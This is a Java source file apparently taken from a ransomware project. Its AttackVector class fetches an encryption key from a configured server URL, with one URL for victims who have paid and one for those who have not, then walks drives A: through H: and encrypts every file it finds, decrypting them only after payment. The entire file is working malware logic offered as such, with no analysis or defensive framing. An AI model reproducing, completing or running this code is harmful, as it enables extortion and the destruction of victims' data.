package Agent.Attack;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Map;

import org.springframework.beans.factory.annotation.Value;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.Utils.AlgorithmsMapUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector {
	@Value("${server.url.get}")
	private String urlgetKey;
	@Value("${server.url.buy}")
	private String urlboughtKey;

	public void cryptFileSystem(boolean isPaid) throws RansomwareException {

		Traverse dfs = new DFS();
		Traverse bfs = new BFS(); 

		CryptoKey key;
		KeyService keyService = new KeyService();
		if (isPaid) {
			key = keyService.getKey(urlboughtKey);
		} else {
			key = keyService.getKey(urlgetKey);
		}

		Collection<File> visitedFolders = new ArrayList<File>();

		for (char i = 'A'; i <= 'H'; i++) {
			try {
				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, isPaid);
				// or
				traverseAndCrypt(i + ":\\", visitedFolders, key, dfs, isPaid);
			} catch (RansomwareException e) {
				throw new RansomwareException("failed crypting the whole file system - ransom exception", e.getCause());
			}

		}
	}

	private Object getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse struct,
			boolean isPaid) throws RansomwareException {

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {

						try {
							CryptoAlgorithm crypto = (CryptoAlgorithm) getCryptClass(AlgorithmsMapUtil.getMap(),
									key.getAlgorithm());

							// if there is payment - the function decrypts the file system
							// Else - encrypts it
							if (isPaid) {
								crypto.decrypt(key.getKey(), file);
							} else {
								crypto.encrypt(key.getKey(), file);

							}
						} catch (RansomwareException e) {
							throw new RansomwareException(e.getCause());
						}
					}
				}

			}
		}
	}
}
